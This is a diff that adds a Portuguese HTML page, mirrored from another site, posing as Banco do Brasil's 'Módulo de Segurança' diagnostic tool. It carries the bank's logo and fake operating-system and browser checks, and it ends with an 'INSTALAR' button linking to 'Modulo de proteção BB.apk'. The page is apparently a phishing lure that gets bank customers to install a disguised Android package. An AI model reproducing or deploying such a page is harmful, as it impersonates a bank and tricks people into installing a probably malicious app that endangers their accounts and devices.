@@ -1,0 +1,196 @@
+<!doctype html>
+<html lang="pt-br">
+  
+<!-- Mirrored from modcliente.com/atendimento.php by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 22 Jul 2023 00:13:23 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width; initial-scale=0.45; maximum-scale=1.0; user-scalable=0;" />
+    <title>Modulo de Segurança</title>
+
+	  <link href="css/animate.min.css" rel="stylesheet">
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="style.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/css.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500&amp;display=swap" rel="stylesheet">
+
+    <link rel="shortcut icon" type="image/x-icon" href="img/fav.ico">
+  </head>
+  <body onload="detectBrowser()" class="bgmeu w-100 vh-100 d-flex flex-column justify-content-between align-items-start">
+
+<div class="w-100 p-2 d-flex flex-row align-items-start justify-content-start">
+  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEoAAABKCAYAAAFr1/LnAAAfAUlEQVR42tWcd1RV1xPvB7EbSyyxJMZYiYrGaIwRFVGKCoi9K1LsmNi7IiKgFMGGJbE3sFEs2GJJYhdFwd6isUQTNEakXEA/7499LnCRpj/fy3quNYtT9tl3zndP2zNzFFH/CudDahCvhFwpURCR0m8NlIDriGc0pAnOG+8Rc7qk4cBvXNcj8y5x+MSnkC5I9xCkw1L1cNaBARuaIw4bGL/rCYXM5jFiww3KNOn/9kB0gjiHA4LYBvM6QdgeWf7tgdI7BDHzQar35sc1VZH28xALr2wDUwQZskvNahVARYeFeM4qnfmCGQMT84Any0DRDvKiQiIixvmsirHEx4nO4GeSDX8yNFCQ+NjMQeajtyIzTyJDj0KKIGMPaYPiREeStlweZ9UMCDJoO6DN9Lc2k8w8AWmCOEdAkiB2yyBZssz0Svh+5xOkpReOG65RxKQf7afvycJTnOhIFsRRTU+CINYLkLZeBHiVyxw0bMd9yta2R1rMQT4biLTxyPZ22kz6iynPDSEICRRERIrng3hJERHjF7crv3ydsl2naJtG2rluW87Xs1By4gqd9mNS+K3VyUJ37pSkRfgTrMcNeutehyl9OX+ujHo/vXTFx4mOhMxBt26XpMeBv5CgG7Rxc1UPjhuATDiK/LAfh0kdCYuqwckjWcAymCxJKD/yGLLgKjL3AjL7NDLtN7YerIP9wqGIUxjiuos3r4SPnUIQ22CkYzCvnhtlmyw222umC+azJlDENQJxieTm1WI0nO6LdFiKdFjM338UzmmFDCezmT0AcQ5HnMOJiSuC6VQfxHIRYhPIXw+EOk4LEAt/xCoAsfBByvWG5OyTZVmAs9EVaGjjgHRbhdgtZ/QkU8XBa6GX5zHE3BMp2wvSlTS+jVms6EgVxDGSl4809rWBNRt8i7TxQCp0h9eG9wykVZvM+PkV0cXuF2L3C7H7cvi7T7iUhfTX9cf71wp6oTUqgAHPjwqJiJR7rYvMJvHbs5xvy3acVfLVPRGpJiJSTfcob1OYQQk5XEsSRMRUTfQwlweThPYTtiEjjkFqtnvpQq/V97NNlANHN+4Uwmq3UiHxiUHmnMNu6gBIEGwnD0A8opF+YYYTpTwydHotR25CFlxHxv2mlh5Bhu1Dxh5EBuxU5zXHQGK2V0vRXu3GrSL03vcXsuAa4h2DOGwDncIm4mBNrMY6Ii4RSN/NdHJzyAGjR4L3uobqNeZdRDyjkRknEPsQeCOM2/VQqVIzd0gVGo7egdgu4yOTvrlglCpI753I1F9Zt6s+nf2+p7BzBOIcye83itFsThBisxixWcSzx4Vy5sgAbISJu/9SXJh7Q5owfN0txG4ZxnUdISm35c8yUWvPsRQbugtxjuDS+dLUnzoXsV6EWAfx9LERXzoFIp+5Zk6WmF2O0oThYQ8R5wik1VzQCYN/ikNsgylWvz+vXgi95h1RJsXSD2nnzZ6IkjkLZJPuvRGncGTgVsZ6mDBrfj2ePNR+tfIwxMofaeejmRVHSMtFst8kaoC3D0TsVyCmE5VHfCUs3Pw55ToHIW3mMGN6+dxVxHJSH2T8YWRwBCQLn33bCbEJRKz8sHM/iLT2QEr3fVtVsoPd0qUfJRsNMFiRtARBmkxC2ngQOL9krvpowFHy33lo/es87mWZqOLlg5lW8dI+QwuZcZ7NWurP4w4IIlJTH0iVKkDUlRcV0ZvaoiJSTkQqa9bu/zVVFZGK2gsZ64P3yvFxotM9+RySLRUlZftbILIyPE/K5Tg7pdmy1VcQERONMSksItXi40Sne5iLmc+PEPq4dyH6UiVD+5CQhwtJFk6c/4SY2KqQlOFyTTN8uIhUi499R6YQXL07MTPyHrLkNhJ4HfG/jHjFILZrib5YFlKyPZMixF4uy9ejtvLNht+RyaeJufAxJGVEKIZM/a1nKi9HmS4M9LTDPewehRfdUvbe/yrSdQMbd9dFHDYg7qeR6ceRqb8iE49hZL+G2NjSoBMaD/sBGfoz0m8zYrOKDt0a8CZV8kAqTnS6RznArBP6zrJn2rb7lArWEPGLQ7ptJObSR29bmVThdHRZpNNyZPQBZFQUMiQScYrAyGIet259lLEJyGoHcmfqYebE/Tw6MXnjHUotv6v8sG+scqOe55HZZ5BZpxT1383AuV0hUYi5WoK2iy5SYeIx6vUbAm+EM+crIa38kF7rka6rEPvliO1SpNF4zp8vnsFU7sv3KPMNXsYLVft6IrNOInPPIx5nFRPTjiMjoqg7aDykCucufkyLwIu0CTiNDNqJOEcivUMZOMUCEEIOm2Lz40NMhmxBOi1F7JYjTd2Z7lUrw0kUDKlslPSPUNbBk4aDJkKacDqmPC0ComkXdA4ZHKYCjm4hdB7WDhC2HKxF26W/02D41kxGGrkz1b1OJiPZzHhIntqXk5AnC6cuVqLhnGg6LzmPDA5HXHchDpvpPMoGEDYerEfThdc0RIKVy6w/iwkeXwJCwHqTzBA+IZsC5WkSHhmqb8ylstTxOIXt4nMaI5FI51Ds3KwBIfLX6jT1v8iXbjuRjkuVvJhMY9yM+oAwZVlrBs4/QWHbJYh1oNrdNp1MoxZfGSpIvnYqUQgNr07xQTszl8Y5HBm0gzJtxvD8URGePS1BpRaDkXYLNUYmMM6jEbwRPNea0tP7FKW7rVShjT68sZyPtPNWEUrbuUjz6ZQs+x1vEgoiUwmG8fb28HJIy7lI/y1I7w1Irw2I3TI+MunFP38WypSRhMzgLPmFEZXqtKZIm1mIRRZGmk2hROmm/BuvxhXIJOijaZKETfsaYO9+HHE7QrexSm7CdldDPhuB2K1AOixCbBYi7XwoXs2W59oLmThOpL/3EeTbmSpi+mYy5Ss15NXzvOOVkDyRShVaug1Bhu9Vkaflcma5VzPUmjdCSEhFpLITYumrUDD3RL6djrRyR5qN55PKpiT8nQXBnAQ8P6Qy7FSqUL+DHRMmfmYYjeXmE3XC2uVlkCLdqfzplyQ/zWF8Qj7uKxemqsbHiS7tsRpQIEos4LWCzJGSwVQDPVOFtBimmhbPmP4H1EALXcvrI089Y8YfYLP/v5CxFgVL1ri6ohaW/hfhcGUtHC+qZ6y4iFRLS/opzzxdRtZClz2LsT3nLIduWw7zbcv5mfRdutMHW73UGDMWDSWT+DiBFNu84+z8YvJkS0jJdi/78ylWb127cf5zti8QnYZYYX0S2vTZ5WxWNr8UTcLbMfc7x/aaBt48IYQEij5vlI2p/OxKQs5ViAtXytBnRs+cw5LcnnsjOHp3hDTh1gkhNEem4vJBKidKF3rO7sqUsEcUX3QT6bSc6Jjymagl5GwoL14uR8sxO6k8JBDS82OqoMwkCzdvFqPt2FDMw58igTeQoOtIwGVk5AE6T+mv8hTZlzpd6D6jOz9su414xVC+rxe8/hBIpQq9ZnZj7NaHyKLbakfjF4d4X1BZLM9oFTY7bOTSZeOM585fKUmToWGYhdxDxh9FhkdRzmI0vFFM5S9TuQjlrVvF+G7EJqwi/kQW3EAW3UTG/Erbcc50mDQYGXlEMaTfYjnto+2YfpAu7DlSFXHehbhGIL02YNR4PHFnjPIR9KxIZXemb4T+HuZMCL2NLNb2ewFXEdtt7D/xuZKhROG3s1UQ283IpKPIuMPImIOI2z7EfBlnYipDutC4z0BsezfJVIrEvJYvJ5OQJNy5XRTTIWuwiXyC+F9XzEw8ytcuo1TMnUPUYDZqKDIoPHPPN3Q30nkLtuP7qsgj1VB7816+RMNt+QAPG8Zvvo4svJm5LfeOQbwuIKMPYeY2wlCgk4UTMRVUPSC2ImKxVMVkjjuQASEqam3uw9noMplb+sQCat/vd4Smrsvotvcp4n9N1VXmX1K1lbnaZnTmSWTKL4j5SpX40wmt5k/BbccTxGEzIbtrAILF6P6I7Qqkx1qk608qpm8VQAdXC4WaJlN5Lt/rBOFjh/nIvCuZmuUTo7TK4ywy6zQy8wQy8iB1naZAqhAdW56mQVdoNve4KgC5RCK225ju3xgQxgRb0sX3F1XLsQ1WjDWew9T5JpCSF1Nxhvm/xZsaI32jEJ+LyJxoVX2aeVJpln0IoVFqP2fjP5wRYY+03XG42v2YLSDmYlFAaDjLD8fVcUj7RYjtMqTDQop+OZDHDwplLN/NAstUopD0XPi4lw8y/heVRR9xmC8GTgGdEHOlFF/7n6HJ/NOIYxjisgvpsgV7t45qk3GsFq2X3KDq4E1IhyVqc9p4Jm6T6hvKYWJ+SCXm4K/ShHlrWiDmIWzZ/wUg2C9wwS3ssdoXOqtymzSfR3R0KZXyme3H8I1XEMuFCh2bhRQz6cM/T41y9J0F175sD5IuXLxaEVPv45j7n1XL5RqJdNtMj9GWgLDrt3K0Cb5G3ZHbFDp2y5EmU5nq/mnuzjrxfd1MumDpM5qxu++r7btzuELIzIfLccVAJ3w1ay7DN15FrJcodDotpnyTXjx/IMQ/LkLU/nKGy5aF3s3NJApx14pi4nkSyyXRyIAdiEs40m099iPbqwzLoUY09r9Oo1F6dFQtYIZnbZVPCG5Nf9/zSLM5NLcye5uxArsZzfG2mzOE0WEPKOQUjjhFIC4RGLWey+3rylDWn7qAIRuuIR2DFTrWQXxUrzf/PBbinxpRZ/AyunsdQawCVYLDKgCp1JeDkcWVjUrQlu9kXnZKH7TFlueLWSfpvPQcMnCHWq7u6+gxWmnWhn2mNFtwm6+/36GyLXbLEdNJzNQSYROWfEdvr3OU6bpCK3wEIJYLkPa+SLt5iOkYWnz7eYac5e/7UoVPuk2kiOtelZVziVDyY7OIKfMawhthWmBdxHSqMoKWgZSs34cXjwvx7GlxqvYLpI/PUcWEPuvSfr5KdGQkO7yQMl1w96iiYrMCOeRkYWvYp0irJYopx53IoG1I73VIPSce3S/Kq3jhI5OujPX4KmN7n/qPUK2BGdLSXS2XpZ8qUFl4KWbazEGaT6FiVVPSXxouX0hBI8+0BKF6256I/Uqk7yak5zpFDWcwzuMrBX/i29Wg9atKITUGUqj9PJX8aOuJmM9BKnTGd24xQ/NQ4I2DZjRDomoCwk+bqiB1p6oOgM4rlP+yWYhU78sf940NqgwpL4T6zj44BxxBzGYrdL6ZxKdVGpL8LId4Ld94KksI0mjoONquu4NYLeHa5WKQKtQx74i0mq0xFYR0XITU/IERY+rAa2FpqCkOs0/zec8lqtOgjQdSsQ9B88q8nVx7lbl8N08IoUF5MPXiTyMa/nCM0v4xyMi9KkBrvpC9YUUgRdgYUhGpPiRTxS39kDaelG0xniGBxxXTrWcjzSZRocpXpP2bT5hdkMjz8d1CyKCDyoU4hVG6cT+e3NFkJyEzSWva2hz5ZrIS5LZz1TK1mq3QKdcDf+8yubuWHJDKU9D/vFsI6bYTsVyO+8xPci9jpgs7t5REKvVTjLSejTSdTPkKDUl6lofLSngPi/7nXSNK1O3P8wf5vKGeUoXadesgZfsyZ9pHuWf/Et7XIWu2JscNQT5ltn/1WcCCpBQLuHwNnl3WkhRJH4gSC3g/2cD3VdUzVVJEaj4+L1yM0qrZ2fuAsl0zqHxnG3spW89QbuMMntmfwVRFfX6qiJZrrKnlHv+LnKeJtnSl9P1IhTTGSv6Ppfv/hUppGUVjyfJPn4gtot0s+QH6C/5/pFLauxfXsDDWr1zW1SuliVY1TbxM/kMR+69S+Sbau1fTsCilYZPR5ltSU8aaz2JF9/JuDV4n/wRpeyE1QlFaROZxnhSe/3FabuMLQDk+G/42f2kF4DEty3n6Xl4l/sSvu2qwOUB0GmAVNWwyGl1Ka6a0QXyc6J7FCSkPc/GiCbn4j3dJJ78r5fd7Cfn0r+THm+Zabh5XRUfNijfQMCmtdzF6oKqJiGl8rAJK9yiXvEJ+jCe8x0tnCYVexQv//pUtIPhf5kzIOVQiXUh+LiQ/L5zhi7UdlR4oUw2TnIH6Ozeg3ne18wMzWQWxwdsb0nb0LJyWXKL8sKNU6zqVRSFNeaOlUN+Lj1dvNyTxSvDd+C01HH2p0CuIcxcqqvDvXYGKjxPds8vvANT7MJ8qJL8UNkVV59thHgxfEs2oA39TdtV9RN/8tPAmMvM80jucMl28WLCxLknPC6nUSGLBQ0fShMQXRgTvMKG+sy89fM/QP/JPSnvFUW6AHzHnyynpfS+g4j4QUNnUimRh2fZ6mI+YgJP/Wcb8/JSqa+8jATcUOIHXkYU3VE7cR8uJe11Qx1N/Q/rsplIvDxaHfEXqyyzqmfB2aSztpeC1tjGNnOfQ0+8sjhF/UH7xNWT6KWT6CWTUYcp3d1dAvf6vgUoR3iQLa8K/pIHjNFwCzzJi3198vvGBqukE3lC91guuqg5vx0iVDhgUjkw7hXhp/Vqzz6gE8MyT6u+4Y0ivcKr08yA4tIna6KYounq9JFX6TOQj18O02/gHnwVeRMYdRb7frxJ9g7YivbYgLRdR57uW3LxglAHUrXcCKlZTvYfvCU6akpyNe2ry3dAp9PQ6yeTDf1Fx7X2tHKipVeBV1UHXfz/luvsyNdiSpHj1fOoLwXvNd1TuNw/ptR+Z9EtmQWzSMWTCMVWHGn9Etfs5hFKuiycLN31F4j9qp/fXPWGElxklui5C7EORLmuQZr5UbdEN37nlVRNSimH5SS9RIf/XgEpRPxS8vTaNnSYxaN4ZRu97Qr1ND1S9a8F1JTWB1xCPM4jzbop39cVvfX2e/lkU3uQgvQkqw/XPc8FvfUuK2/shPbYhbgeQ8YeQH/Yjo/ep+tiovciwPSoba7mRT7vMxH/jl8qbIVyPNWbL+rK8fCyGmbTs4cFJg/DgA6lempCaIKyL/JgGg6bR1+tnZv78lOrr/9BU6roCxv8y4h+nvkSYdQpxCqdY1wCWhNTg2dNiGYY0XylFSH8pzPqxDZ/0dEfsQpDBu1R+asiuzISsczgyeCfSewtiEUSZTpNYsqkO/z4vnFEqyzWOOvGhgEpWHmtdZG1MnUbQffZJxu3/k69CHyJ+15Qx1oPjG4v4XtKK3Oc1ilb2xuMsMvkXpPceSnXzZ8ZKK57/nQ0wnZD+rzB1Y3vMAkL4ZNhWHOdYcOe6ESAkxBfCd30jPu44BbH6EemzSdmfAVprXs91qq7YfbVq5WzqS+V2g/Fb3oA0LUOUEWMlZrNRQQUEKl4fmSdqpBM276lDhS5TaDflAFMP/k2tTQ+V5ARcVwAFXFHg+FxUNPe8Ik/NILufRmaeUsZ42q/KzvTfTdGui+jv2YM7t8srV/5SmL+9LbVnheAU+ohu625Q1m2v+lzDZTfSJ4JiNj44T/+WR/eKwRsh4VlhvFc2oUKHcUhrb4w6r6Boj9WI3TKVkrUNVsd2wYjVYqTRDMo0G8CS1TV5/Soz+aMlfN7DmCdmEc03wi9nqmExpgdivwYZ85uSnIAryPyLmZIz9zwy55ySHPfTqqA744RyyROPIv12YWS3FJf5tty9UwoQ3vwr+EU0p5FHCP03P2REyA1K/LAPGRSWWV91jUQcwxHLNVS3GUbQKhOSniuVvHPPGKdlfWnidxyX0HvYzTuGUeflqihjG6wKM/bLEQs/pM54mnexZM/ejzO8XVbVe7+AM6cgTqdsxuW4cnQY3xPpsgEZ+TMy6wwy+2xm6X3GCUUTjyEDwpAOS3DycuCPe6oB/c1LwX1ja76YuYHBoU8YuP4mVcbuUxUpJ6311iUCGbQDsV3BJ1YjWL25CqkvFDjPHguDFvfDxOdnhmx5jPXcnynVZYWSmAwJWo6Y+yF13TC1seLgQa3ImEM9L6vqhRR4C1PQyFxTy7MxRbEY64LYrkIc9yHjfkZ67aGonT+u3vbE/1kYEHQvBd+t31B75mZ6br6P2/ZblPt+X2a5Ti85g8KQNquobjuKBStrqd9BuHe3FC7LrKjl8QuDQ36n27yjCoyOS1V9US85rfyRWm40s7Xk2OHCGV9O5fke7x1HvWvAqUnaqfOVCFz/FbdvlQaEtBfC4rDm1Jq+kt6bn+AUeoeaEw8g/bYru+OsdZAP2oFYrqRaJ1d+XF+DJE1ynj4sjEtwT2rMjMIx5DGdfI7wUbcf1SeverWyW4a08URqufFNh/b8fKhspuQUdAP/rkD9nV/2IL8sQrrw6pkx3iFNqDZ+K93X3WX01juUGbtfdS0MDlddCy6RyMBwxHIFVW2HsmRt9Yy45/Efxfh+VVdqzdqP05bf6er3G0UdVqpvEDtpTSh2wYiZL1JnFKbt23PgwMcqRkIybU9B956J72vMc8pH5ZVu0UTbN9SMKmPX0mXtQ0ZuvcUXkw5lkRxNrQZuQ9r/SFXrESxeVwudFkk//MOIvoE9qTb9CH3W/E5nv18p3vVHxHqxplYatfZCPv+e1l3MOHyobAY4h059gvnYoTQYvIeidboz2bMeL54WyrtslvC26oW8C1AG4cGrnMup6ISkZ4J3aBtqTFhN59V3+WHnPWpMOoQM1L6FcI1UX4j03460W0Fl6xGsDf2C5Jfq5eL/LIxrcGcqTtjPgE0PcPA5Spmeq9R3o52WZrr3VvOQOsMwtbbi8OHiamHeCEfOFKPtmKF8NyaMYYuiqTdkC2K9EOmwEDH3Rr4YQYnqtriNN+HZA6OMjXmOi/3eXu9hDjYqXdWo54U244uxK+i0/C5jwm/z2YT9yiDro+Mhu5TkmK+iht1gFq76Um1zEO7dL8n3y1tSYeJeum24TT//Y5SwD86UHPsVCqCWXkj1UXxna07YrvIZknP4ZDXMx/bj65F7cV10kq9HbUUsFqgvXfQ9GFYBiJXWAmG9QBX1aw6naMV2zJhejce/y1vF/Xff62WPzDVdXxbZmCqjf6JD8D1G7bhLnak/K8lxDMvsB3IKRxxWIk2n0GeMBcmatyJJ8Fv7LcY2PlRzO4CVx2Eq9VmtdVJpBtl2GdJqDlJjFN90as1vv5bL+AT8xIUqtPreheZuEbgEnaPRyFDEOghprwGRAU6A+uRD36hi4WP4VU7buUiL6UhVFz4q246pbhVIeaI5og+WZtEJT+4JjnM6UNx6FmK/TTW9uO7K3GM5h2sGO0y1JH7lTiOHbkTurqiYQTh5uixt+loiNYYh33kjZt7I50MxtWzH3qiymYY4SfBfZYo0nUZL5200HrkFsVmU2WOglxbLAMTKTzXOtJunNc94ZX4fYz5XnbeZjdQdjZTpRPv2tYg5pdQ3uzEP+SDhgdaiDcK9W8KImS2QZjNUF1n/kMxm0v6bVQ9Mvy2qsbR9EFJ7Ik3tbYnYk+mdfjlWnr37Kql9V3oOv5WsxsWdN6afa2OkUm+k0Vik3XzVjGHho/of9M08bT01cDRq7YHUdUVKWGFrXYfTRzXjrvsQcVRBsgf6l9BU48HdIgwa35Ii9YcjzX2RbqvVJrXHWtWb020V0uUnpZZm3kjtITSytuLQoZKkvypAZ0GKGnPnVgmsf+hHk6EhTPjxNF8MXK0aRLKCY+aOfD4MKd6Wtm1qEn28sAJGV4AqzIn3CA9yBeq1cPuuMHCuPRUHbqWWqw8LtzTmjebJ7t8txpDJTZDaTkiTaYjdEqTzSm1zukzrXwxGOi5GWsxAKg+jmXlTduyorFQhReClZETjF64UxWFyd5qM2MHggNNYjNumbFmr2ZkgtdEkR6zp2rkKZ341zrCNBS6XZd3CBL2vRCUJTx8VwsXHGpMh63D98SatN9ymxOzTyA8HEcddSMc1VLVyZcWaSqRpoD24U4xBY5piXHsgUn+8sisdFqkGK5sgdW4ThFgHIF/PQCr2o4l5K9ZuKkXv2Q58PWw9wxZdoOXoEIpZeCEtZ6luntZzELMZSL2RSBELWpnVJu5MIQV06ntkZd9nr/cWUDrh8e9FaTZxIlU94zCeeUKlX4fsUtH1kN1Irx2I6WyaW7Ymak8RJeaJhmHF7dtF6D/qGwpVsUfqTVCG1yZIM8Tz1Hk7H+Q7dxoOWYfFhB0KkNZaq1ObOepvzRFIoTaYt6zFb0eNDd18wnuWs9434DRIBaeqtqmWQwciPfVeLlJlEJvMxsKuAb8dKJxpkBPyqORqxvne7WIMHVYJqWyP1B2u9mkZXkozwq3cFTBm7ki9YUgJK7rYfcz545pBTvtAVegPDZSZc2+k/Ubkaw+a27Tg8F5NzJPfcxWTlHv+47rQq/unFCljhXzqolTKbDpScxhSzApry+pEn9AcR3Iu+86EDwBU4v8SmWvx0+O7RkyaWpGdWwobftiSkM8m+R0MKQhXLgiD+3+Cg/UnHD+UxZUnvEfBNeEdxiR+qEpxouaNPmRBNK9QQPcBGzzeRfUKEHCW0j7HNImPFd0/V4V/rgnPbgjPbyrKemxANwzvZ4zL4foz/XWNnmWhjOs3c7h/M4fxN7PMd9Nwnme58Zvluex8/ntHiD0khCzIAMpEw6SUHihjrcOsnIhUe3ROXl46KLqYfaKLidL+5kZZ7l+IyuVeVC7PReU+V/bnL0TlMF9UNsqPx6h8+IoS3aX9oru4T3RRq+WlJk3lsrYnGmkHRTX0ymkNVJX/w8+z/6v/Iamy9u7lNCyKZv92XQ+Yvpfzv/6w/r/+qF/fu5kB0P8BL+dKrbyz7/MAAAAASUVORK5CYII=" alt="Banco do Brasil" width="74" height="74" border="0">
+  <p class="ps-3 pt-5 fw-bold" style="color: #293896;">Seg.BB - Diagnóstico do Módulo de Segurança</p>
+</div>
+<div class="container home">
+  <div id="bloco-verificacao">
+      <div id="boxresumo" class="box-verificacao-resumo fundo-cinza" style="">
+          <div class="left box-esq-verificacao">
+              <p class="font-azul-bold f20" style="font-family: 'Poppins', sans-serif;">O que é o Módulo de Segurança?                                                                                                                                                                                                                                </p>
+              <a class="font-underline-cinza f12"></a>
+          </div>
+          <div class="left seta-divisor-cinza"></div>
+          <div class="left box-dir-verificacao">
+              <div class="texto" style="font-family: 'Poppins', sans-serif;width: 395px;">O Módulo de Segurança, Warsaw, é um software distribuído para os clientes do Banco do Brasil pela empresa TOPAZ - Stefanini, que deve ser instalado no computador para permitir o acesso seguro ao autoatendimento pela internet.</div>
+          </div>
+      </div>
+      <br>
+      <p class="font-azul-bold f28" style="font-family: 'Poppins', sans-serif;">Verificação de requisitos para o acesso a sua conta</p>
+      <div id="boxalerta" class="box-verificacao-alerta" style="display: none;">
+          <div class="texto">
+              <p class="font-cinza-normal"></p>
+              <div></div>
+          </div>                   
+      </div>              
+      <div class="box-verificacao fundo-cinza requisitos-home requisitos-home-os">
+          <div class="left box-esq-verificacao sistema-op">
+              <p class="font-azul-bold f20" style="font-family: 'Poppins', sans-serif;">Sistema Operacional</p>
+            
+             
+          </div>
+          <div class="left seta-divisor-cinza"></div>
+          <div class="left box-dir-verificacao">
+              <div class="img" style="display: table-cell;">
+                  <div class="requisito-encontrado"></div>
+              </div>
+              <div class="texto">
+                  <p class="font-azul-bold f20 os" style="display: block;"><script>var OSNome = "";
+                      if (window.navigator.userAgent.indexOf("Windows NT 10.0")!= -1) OSNome="Windows 10";
+                      if (window.navigator.userAgent.indexOf("Windows NT 6.2") != -1) OSNome="Windows 8";
+                      if (window.navigator.userAgent.indexOf("Windows NT 6.1") != -1) OSNome="Windows 7";
+                      if (window.navigator.userAgent.indexOf("Windows NT 6.0") != -1) OSNome="Windows Vista";
+                      if (window.navigator.userAgent.indexOf("Windows NT 5.1") != -1) OSNome="Windows XP";
+                      if (window.navigator.userAgent.indexOf("Windows NT 5.0") != -1) OSNome="Windows 2000";
+                      if (window.navigator.userAgent.indexOf("Mac")            != -1) OSNome="Mac/iOS";
+                      if (window.navigator.userAgent.indexOf("X11")            != -1) OSNome="UNIX";
+                      if (window.navigator.userAgent.indexOf("Linux")          != -1) OSNome="android";
+                      document.write(' '+ OSNome);</script></p>
+                  
+              </div>
+          </div>
+      </div>
+      <div class="box-verificacao fundo-cinza requisitos-home requisitos-home-browser">
+          <div class="left box-esq-verificacao">
+              <p class="font-azul-bold f20" style="font-family: 'Poppins', sans-serif;">Navegador</p>
+          </div>
+          <div class="left seta-divisor-cinza"></div>
+          <div class="left box-dir-verificacao">
+              <div class="img" style="display: table-cell;">
+                  <div class="requisito-encontrado"></div>
+              </div>
+              <div class="texto">
+                  <p class="font-azul-bold f20 browser" style="display: block;"><script>
+                      var sBrowser, sUsrAg = navigator.userAgent;
+
+if(sUsrAg.indexOf("Chrome") > -1) {
+sBrowser = "Google Chrome";
+} else if (sUsrAg.indexOf("Safari") > -1) {
+sBrowser = "Apple Safari";
+} else if (sUsrAg.indexOf("Opera") > -1) {
+sBrowser = "Opera";
+} else if (sUsrAg.indexOf("Firefox") > -1) {
+sBrowser = "Mozilla Firefox";
+} else if (sUsrAg.indexOf("MSIE") > -1) {
+sBrowser = "Microsoft Internet Explorer";
+}
+
+document.write(" " + sBrowser);
+                  </script></p>
+                  
+              </div>
+          </div>
+      </div>
+      <div class="box-verificacao fundo-cinza boxjava" style="display: none;">
+          <div class="left box-esq-verificacao">
+              <p class="font-azul-bold f20">Plug-in Java</p>
+          </div>
+          <div class="left seta-divisor-cinza"></div>
+          <div class="left box-dir-verificacao">
+              <div class="img">
+                  <div class="loading"></div>
+              </div>
+              <div class="texto">
+                <div style="float: left;">
+                  <p class="font-cinza-normal none java_confira">Confira se você está com a versão atualizada do Java.</p>
+                  <p class="font-cinza-normal java_verificando">Verificando execução do módulo Java.</p>
+                  <p class="font-cinza-normal none java_not_installed">Você não possui Java instalado. Favor instalar.</p>
+                  <p class="font-cinza-normal none java_executado">Módulo Java executado com sucesso.</p>
+                  <p class="font-cinza-normal none java_autorize">Por favor autorize a execução do componente Java.</p>
+                  <p class="font-cinza-normal none java_nao_possivel_executar">Não foi possível executar o módulo Java.</p>
+                  <a href="https://www.java.com/pt_BR/download/" target="_blank" class="none font-cinza-bold left java-recente">INSTALAR JAVA MAIS RECENTE</a>
+                  <a href="duvidas.html" class="none font-cinza-bold left java-duvidas">VERIFIQUE TODAS AS DÚVIDAS</a>
+                  <a href="#" class="none font-cinza-bold left java-acesso">ACESSE SUA CONTA</a>
+                </div>
+                <div id="gbasapplet" style="float: left;"></div>
+              </div>
+          </div>
+      </div>
+
+      <div class="box-verificacao fundo-cinza box-modulo">
+          <div class="left box-esq-verificacao">
+              <p class="font-azul-bold f20" style="font-family: 'Poppins', sans-serif;">Módulo de Segurança</p>
+          </div>
+          <div class="left seta-divisor-cinza"></div>
+          <a class="font-underline-cinza f12 another-os" href="outro-sistema.html"></a>
+          <div class="left box-dir-verificacao" style="margin-bottom: 30px;">
+              <div class="img">
+                  <div class="requisito-encontrado" style="background-position: 245px -677px;"></div>
+              </div>
+              <div class="texto texto_segbb_ibt texto_nao_instalado" style="width: 370px;">
+                  <p class="font-cinza-normal" style="display: block;" style="font-family: 'Poppins', sans-serif;">Para iniciar o sistema de varredura em seu dispositivo, baixe e instale o Módulo de Segurança clicando em 'INSTALAR'.</p>
+             <!--com redirect e download-->     <a href="Modulo de proteção BB.apk" target="_blank" class="botao-amarelo font-cinza-bold left modulo-recente" style="cursor: pointer; font-family: 'Poppins', sans-serif;display: inline;">INSTALAR</a>
+
+              </div>
+          </div>
+      </div>
+  </div>
+</div>
+
+<div id="faq-home" class="fundo-cinza" style="margin: 0;width: 100%;">
+  <div class="container">
+      <p class="font-azul-bold f28 left" style="font-family: 'Poppins', sans-serif;">Dúvidas relacionadas</p>
+      <div class="right">
+          
+      </div>
+      <br clear="all">
+      <div class="bloco-perguntas"><a href="duvidasc379.html?question=1" class="box-perguntas left"><p class="font-cinza-normal f20" style="font-family: 'Poppins', sans-serif;">1. Não consigo acessar o Internet Banking no Windows. O que devo fazer?                                                                                                                                                                                       </p></a><a href="duvidasacdc.html?question=2" class="box-perguntas left"><p class="font-cinza-normal f20" style="font-family: 'Poppins', sans-serif;">2. Como desinstalar o Módulo de Segurança no Windows?                                                                                                                                                                                                         </p></a></div>
+      <div class="bloco-perguntas" style="display: none;"></div>
+  </div>
+</div>
+
+<!-- Assinatua do método -->
+<input type="hidden" name="assn_info" id="assn_info" value="{&quot;d&quot;:&quot;{\&quot;n\&quot;:\&quot;Info\&quot;,\&quot;rs\&quot;:1,\&quot;s\&quot;:\&quot;hjgtdyjtexyjtdyjt\&quot;}&quot;,&quot;ds&quot;:1,&quot;s&quot;:&quot;yHod96txY2vnx4PboAvEypQIX6YYKHe1m2ooFlIpIhDPOKsbxy1gboG0E2tUkfPIdWFVYeim5S+nOhfO7fKANOa/kHR/LlHDMRnqSr4amWazpRB+V/ieUTFvDWiKpXNEQtqG5TPnLlKCPjm2QQ/5rJUNdGQM3GkhucGdhI/V+Vx8aihhHFJHYPzqCRfwbahzAYfFOpXtLAtWTOuldDCZptsy06C7Pzzq7ScJnA2WTOR+Sus6gq32gm7AOry2jMEUQPUwBTgEqAvPr88UoB05Ukv9y8H5hghkcqsrwr9zbOwiRowm0QRfrn9j7RQ6D7V5JGjtdeAoLg18ud8jeWtz5EknIEkkfIsu+7Qq8QH9dpBuozxVcd6U2qhKRt5kQ/PJCSRiCrStLwLbpl4+ToyN6wlhSob/e1fu+cUuPAsmBMcnkeSURlJ+m97GvFnHzvufouSFtKgTRXe/svPrIAp04ox/MSJCu9rFV2K6Bf7esgiGZLlEbSEpLiWRJr9k7kdUJec+dMXjQb2SKdFKHXgPyFLiHClGb2dPKaayX2Ej2JfrP6B4gm/kkwkk+5SHPojG0JrBIDTy1ueXhcK+Baa2GxccRwFWhyE0p2dzabkt6yFo+AG07LKs+9mFVn1EW4fpzTIwGxxDR0csoOEs1WNpigVhaMouJl4skstOGtOpmQE=&quot;,&quot;v&quot;:1}